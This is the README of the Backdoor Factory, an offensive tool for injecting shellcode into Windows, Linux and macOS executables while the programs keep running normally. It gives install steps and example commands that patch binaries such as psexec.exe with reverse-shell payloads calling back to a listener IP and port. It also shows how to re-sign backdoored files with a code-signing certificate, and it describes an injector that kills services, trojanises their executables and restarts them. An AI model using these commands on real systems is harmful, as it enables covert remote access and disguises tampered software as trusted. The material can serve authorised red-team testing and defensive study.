##The Backdoor Factory (BDF)
For security professionals and researchers only.

The goal of BDF is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state.

###Dependences
#####*To use OnionDuke you MUST be on an intel machine because aPLib has no support for the ARM chipset yet.*


[Capstone engine](http://www.capstone-engine.org) can be installed from PyPi with:

    sudo pip install capstone

Pefile, most recent:
    
    https://code.google.com/p/pefile/

osslsigncode (included in repo): 
    
    http://sourceforge.net/p/osslsigncode/osslsigncode/ci/master/tree/

Kali Install:

      apt-get update
      apt-get install backdoor-factory


Other *NIX/MAC INSTALL:

    ./install.sh

This will install Capstone with 3.01 pip to install pefile.

UPDATE:

    ./update.sh

##Supporting: 

    Windows PE x86/x64,ELF x86/x64 (System V, FreeBSD, ARM Little Endian x32), 
    and Mach-O x86/x64 and those formats in FAT files
    
    Packed Files: PE UPX x86/x64
    
    Experimental: OpenBSD x32 


Some executables have built in protections, as such this will not work on all binaries.  It is advisable that you test target binaries before deploying them to clients or using them in exercises.  I'm on the verge of bypassing NSIS, so bypassing these checks will be included in the future.

    Many thanks to Ryan O'Neill --ryan 'at' codeslum <d ot> org--
    Without him, I would still be trying to do stupid things 
    with the elf format.
    Also thanks to Silvio Cesare with his 1998 paper 
    (http://vxheaven.org/lib/vsc01.html) which these ELF patching
    techniques are based on.



Recently tested on many binaries.

./backdoor.py -h 
    Usage: backdoor.py [options]

##Features:

###PE Files

    Can find all codecaves in an EXE/DLL.
    By default, clears the pointer to the PE certificate table, thereby unsigning a binary.
    Can inject shellcode into code caves or into a new section.
    Can find if a PE binary needs to run with elevated privileges.
    When selecting code caves, you can use the following commands:
      -Jump (j), for code cave jumping
      -Single (s), for patching all your shellcode into one cave
      -Append (a), for creating a code cave
      -Ignore (i or q), nevermind, ignore this binary
    Can ignore DLLs
    Import Table Patching
    AutoPatching (-m automtic)
    Onionduke (-m onionduke)

###ELF Files

    Extends 1000 bytes (in bytes) to the TEXT SEGMENT and injects shellcode into that section of code.

###Mach-O Files
    Pre-Text Section patching and signature removal

###Overall
    
    The user can :
      -Provide custom shellcode.
      -Patch a directory of executables/dlls.
      -Select x32 or x64 binaries to patch only.
      -Include BDF is other python projects see pebin.py and elfbin.py

Sample Usage:

###Patch an exe/dll using an existing code cave:

    ./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp 

    [*] In the backdoor module
    [*] Checking if binary is supported
    [*] Gathering file info
    [*] Reading win32 entry instructions
    [*] Looking for and setting selected shellcode
    [*] Creating win32 resume execution stub
    [*] Looking for caves that will fit the minimum shellcode length of 402
    [*] All caves lengths:  (402,)
    ############################################################
    The following caves can be used to inject code and possibly
    continue execution.
    **Don't like what you see? Use jump, single, append, or ignore.**

###Patch an exe/dll by adding a code section:

    ./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a

###Patch a directory of exes:
    ./backdoor.py -d test/ -i 192.168.0.100 -p 8080 -s reverse_shell_tcp -a
    ...output too long for README...

---

###User supplied shellcode:
    msfpayload windows/exec CMD='calc.exe' R > calc.bin
    ./backdoor.py -f psexec.exe -s user_supplied_shellcode -U calc.bin
    This will pop calc.exe on a target windows workstation. So 1337. Much pwn. Wow.

###PEcodeSigning

BDF can sign PE files if you have a codesigning cert. It uses osslsigncode.
Put your signing cert and private key in the certs/ directory.  Prep your certs using openssl commands from this blog post:
http://secureallthethings.blogspot.com/2015/12/add-pe-code-signing-to-backdoor-factory.html

Put your private key password in a file (gasp) as so (exactly as so): 
    
    echo -n yourpassword > certs/passFile.txt

Name your certs EXACTLY as follows:
	
    signingCert.cer => certs/signingCert.cer
    signingPrivateKey.pem => certs/signingPrivateKey.pem

Your certs/ directory should look excatly as so:
    
    certs
    ├── passFile.txt
    ├── signingPrivateKey.pem
    └── signingCert.cer

Enable PE Code Signing with the -C flag as so:

     ./backdoor.py -f tcpview.exe -s iat_reverse_tcp_inline -H 172.16.186.1 -P 8080 -m automatic -C


On successful run you should see this line in BDF output:

    [*] Code Signing Succeeded

###Hunt and backdoor: Injector | Windows Only
    The injector module will look for target executables to backdoor on disk.  It will check to see if you have identified the target as a service, check to see if the process is running, kill the process and/or service, inject the executable with the shellcode, save the original file to either file.exe.old or another suffix of choice, and attempt to restart the process or service.  
    Edit the python dictionary "list_of_targets" in the 'injector' module for targets of your choosing.

    ./backdoor.py -i -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a -u .moocowwow
